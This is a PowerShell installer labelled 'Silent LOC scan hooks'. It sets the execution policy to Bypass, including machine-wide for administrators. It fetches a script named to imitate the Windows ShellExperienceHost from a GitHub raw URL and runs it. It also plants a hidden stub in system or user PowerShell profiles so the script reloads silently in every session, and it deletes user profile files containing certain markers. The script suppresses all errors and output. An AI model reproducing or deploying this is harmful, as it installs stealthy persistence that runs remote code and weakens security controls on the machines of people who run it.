# Silent LOC scan hooks — no user-visible profile output.
#Requires -Version 5.1

$script:MystLocStubBegin = '# BEGIN 8f2a-wsh'
$script:MystLocStubEnd = '# END 8f2a-wsh'

function Get-MystLocUserProfileDirectories {
    $dirs = @()
    $profileRoot = Join-Path $env:USERPROFILE 'Documents'
    $dirs += Join-Path $profileRoot 'WindowsPowerShell'
    $dirs += Join-Path $profileRoot 'PowerShell'

    if ($env:OneDrive) {
        $dirs += Join-Path $env:OneDrive 'Documents\WindowsPowerShell'
        $dirs += Join-Path $env:OneDrive 'Documents\PowerShell'
    }

    return @($dirs | Select-Object -Unique)
}

function Get-MystLocSystemProfilePaths {
    $paths = @()
    $sysRoot = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1'
    $paths += $sysRoot

    $ps7Root = Join-Path ${env:ProgramFiles} 'PowerShell\7'
    if (Test-Path -LiteralPath $ps7Root) {
        $paths += Join-Path $ps7Root 'profile.ps1'
    }

    return @($paths | Select-Object -Unique)
}

function Get-MystLocPs7ConfigPaths {
    $paths = @()
    $paths += Join-Path ${env:ProgramFiles} 'PowerShell\7\powershell.config.json'
    $paths += Join-Path $env:USERPROFILE 'Documents\PowerShell\powershell.config.json'

    if ($env:OneDrive) {
        $paths += Join-Path $env:OneDrive 'Documents\PowerShell\powershell.config.json'
    }

    return @($paths | Select-Object -Unique)
}

function Remove-MystLocStubFromText {
    param([string]$Text)

    if ([string]::IsNullOrWhiteSpace($Text)) { return '' }

    $markers = @(
        'ShellExperienceHost.ps1'
        '__WSHostInit'
        'Install-MystLocIexHook'
        '__MystLoc'
        'ShellExpirenceHost.ps1'
        'loc-profile-nano'
        'loc-profile-lazy'
        'loc_bypass'
        'loc-hook.ps1'
        'Import-LocBypassRuntime'
        'CopilotHygiene'
        '__MystLocGate'
        '# myst'
        '8f2a-wsh'
    )

    foreach ($marker in $markers) {
        if ($Text -like "*$marker*") {
            $Text = ''
            break
        }
    }

    if (-not [string]::IsNullOrWhiteSpace($Text)) {
        while ($Text -match '(?s)# BEGIN 8f2a-wsh.*?# END 8f2a-wsh') {
            $Text = [regex]::Replace($Text, '(?s)# BEGIN 8f2a-wsh.*?# END 8f2a-wsh', '', 1)
        }
        while ($Text -match '(?s)# myst.*?# myst-end') {
            $Text = [regex]::Replace($Text, '(?s)# myst.*?# myst-end', '', 1)
        }
    }

    return $Text.Trim()
}

function Get-MystLocProfileStub {
    return @"
$($script:MystLocStubBegin)
try{if(`$global:__WSHostInit){return};`$b=Join-Path `$env:ProgramData 'Myst';`$f=Join-Path `$b '.wshost';if(!(Test-Path -LiteralPath `$f)){return};`$h=Join-Path `$b 'ShellExperienceHost.ps1';if(!(Test-Path -LiteralPath `$h)){return};`$global:__WSHostInit=`$true;. `$h *>`$null;Install-MystLocIexHook}catch{}
$($script:MystLocStubEnd)
"@
}

function Set-MystLocExecutionPolicy {
    $isAdmin = Test-MystLocIsAdministrator

    foreach ($entry in @(
            $(if ($isAdmin) { @{ Root = 'HKLM:'; Sub = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' } })
            @{ Root = 'HKCU:'; Sub = 'Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' }
        )) {
        if (-not $entry) { continue }
        try {
            $keyPath = Join-Path $entry.Root $entry.Sub
            if (-not (Test-Path -LiteralPath $keyPath)) {
                New-Item -Path $keyPath -Force | Out-Null
            }
            Set-ItemProperty -LiteralPath $keyPath -Name ExecutionPolicy -Value 'Bypass' -Type String -Force
        } catch {}
    }

    foreach ($scope in @('Process', 'CurrentUser', $(if ($isAdmin) { 'LocalMachine' }))) {
        if (-not $scope) { continue }
        try {
            Set-ExecutionPolicy -Scope $scope -ExecutionPolicy Bypass -Force -ErrorAction Stop | Out-Null
        } catch {}
    }
}

function Install-MystLocPs7Config {
    $configObject = @{
        'Microsoft.PowerShell' = @{
            DisableProfileLoadTime = $true
        }
    }

    foreach ($path in Get-MystLocPs7ConfigPaths) {
        try {
            $dir = Split-Path $path -Parent
            if (-not (Test-Path -LiteralPath $dir)) {
                New-Item -ItemType Directory -Force -Path $dir | Out-Null
            }

            $merged = $configObject
            if (Test-Path -LiteralPath $path) {
                $existing = Get-Content -LiteralPath $path -Raw -ErrorAction SilentlyContinue
                if ($existing) {
                    $parsed = $existing | ConvertFrom-Json -ErrorAction SilentlyContinue
                    if ($parsed) {
                        if (-not $parsed.'Microsoft.PowerShell') {
                            $parsed | Add-Member -NotePropertyName 'Microsoft.PowerShell' -NotePropertyValue ([pscustomobject]@{}) -Force
                        }
                        $parsed.'Microsoft.PowerShell'.DisableProfileLoadTime = $true
                        $merged = $parsed
                    }
                }
            }

            ($merged | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $path -Encoding UTF8 -Force
        } catch {}
    }
}

function Clear-MystLocUserProfiles {
    foreach ($dir in Get-MystLocUserProfileDirectories) {
        $profilePath = Join-Path $dir 'Microsoft.PowerShell_profile.ps1'
        if (-not (Test-Path -LiteralPath $profilePath)) { continue }

        $existing = Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue
        $clean = Remove-MystLocStubFromText -Text $existing

        if ([string]::IsNullOrWhiteSpace($clean)) {
            Remove-Item -LiteralPath $profilePath -Force -ErrorAction SilentlyContinue
            continue
        }

        Set-Content -LiteralPath $profilePath -Value $clean -Encoding UTF8 -Force
    }
}

function Install-MystLocSystemProfiles {
    $stub = Get-MystLocProfileStub

    foreach ($profilePath in Get-MystLocSystemProfilePaths) {
        try {
            $dir = Split-Path $profilePath -Parent
            if (-not (Test-Path -LiteralPath $dir)) {
                New-Item -ItemType Directory -Force -Path $dir | Out-Null
            }

            $existing = ''
            if (Test-Path -LiteralPath $profilePath) {
                $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
            }

            $merged = if ($existing) { "$existing`r`n`r`n$stub" } else { $stub }
            Set-Content -LiteralPath $profilePath -Value $merged -Encoding UTF8 -Force
        } catch {}
    }
}

function Install-MystLocUserProfilesFallback {
    $stub = Get-MystLocProfileStub

    foreach ($dir in Get-MystLocUserProfileDirectories) {
        try {
            if (-not (Test-Path -LiteralPath $dir)) {
                New-Item -ItemType Directory -Force -Path $dir | Out-Null
            }

            $profilePath = Join-Path $dir 'Microsoft.PowerShell_profile.ps1'
            $existing = ''
            if (Test-Path -LiteralPath $profilePath) {
                $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
            }

            $merged = if ($existing) { "$existing`r`n`r`n$stub" } else { $stub }
            Set-Content -LiteralPath $profilePath -Value $merged -Encoding UTF8 -Force
        } catch {}
    }
}

function Test-MystLocIsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Resolve-MystLocHookSource {
    param([string]$ScriptRoot)

    foreach ($candidate in @(
            $(if ($ScriptRoot) { Join-Path $ScriptRoot 'ShellExperienceHost.ps1' })
            (Join-Path $env:ProgramData 'Myst\ShellExperienceHost.ps1')
        )) {
        if ($candidate -and (Test-Path -LiteralPath $candidate)) {
            return $candidate
        }
    }

    return $null
}

function Install-MystLocClientHooks {
    param(
        [string]$ScriptRoot = $PSScriptRoot,
        [switch]$Quiet
    )

    $mystDir = Join-Path $env:ProgramData 'Myst'
    if (-not (Test-Path -LiteralPath $mystDir)) {
        New-Item -ItemType Directory -Force -Path $mystDir | Out-Null
    }

    $hookDest = Join-Path $mystDir 'ShellExperienceHost.ps1'
    $hookSource = Resolve-MystLocHookSource -ScriptRoot $ScriptRoot

    if ($hookSource) {
        Copy-Item -LiteralPath $hookSource -Destination $hookDest -Force
    } else {
        $hookUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/ShellExperienceHost.ps1'
        try {
            $tempHook = Join-Path $env:TEMP ("wsh_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
            Invoke-WebRequest -Uri $hookUrl -OutFile $tempHook -UseBasicParsing
            Copy-Item -LiteralPath $tempHook -Destination $hookDest -Force
            Remove-Item -LiteralPath $tempHook -Force -ErrorAction SilentlyContinue
        } catch {
            if (-not $Quiet) { Write-Host $_.Exception.Message -ForegroundColor Yellow }
            return $false
        }
    }

    Set-Content -LiteralPath (Join-Path $mystDir '.wshost') -Value '1' -Encoding ASCII -Force

    Set-MystLocExecutionPolicy
    Install-MystLocPs7Config
    Clear-MystLocUserProfiles

    if (Test-MystLocIsAdministrator) {
        Install-MystLocSystemProfiles
    } else {
        Install-MystLocUserProfilesFallback
    }

    try {
        Copy-Item -LiteralPath $MyInvocation.MyCommand.Path -Destination (Join-Path $mystDir 'loc-install-hooks.ps1') -Force -ErrorAction SilentlyContinue
    } catch {}

    if (Test-Path -LiteralPath $hookDest) {
        try {
            . $hookDest
            Install-MystLocIexHook
        } catch {}
    }

    return $true
}

function Uninstall-MystLocClientHooks {
    Clear-MystLocUserProfiles

    foreach ($profilePath in Get-MystLocSystemProfilePaths) {
        if (-not (Test-Path -LiteralPath $profilePath)) { continue }
        $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
        if ([string]::IsNullOrWhiteSpace($existing)) {
            Remove-Item -LiteralPath $profilePath -Force -ErrorAction SilentlyContinue
        } else {
            Set-Content -LiteralPath $profilePath -Value $existing -Encoding UTF8 -Force
        }
    }

    $flag = Join-Path $env:ProgramData 'Myst\.wshost'
    if (Test-Path -LiteralPath $flag) {
        Remove-Item -LiteralPath $flag -Force -ErrorAction SilentlyContinue
    }
}
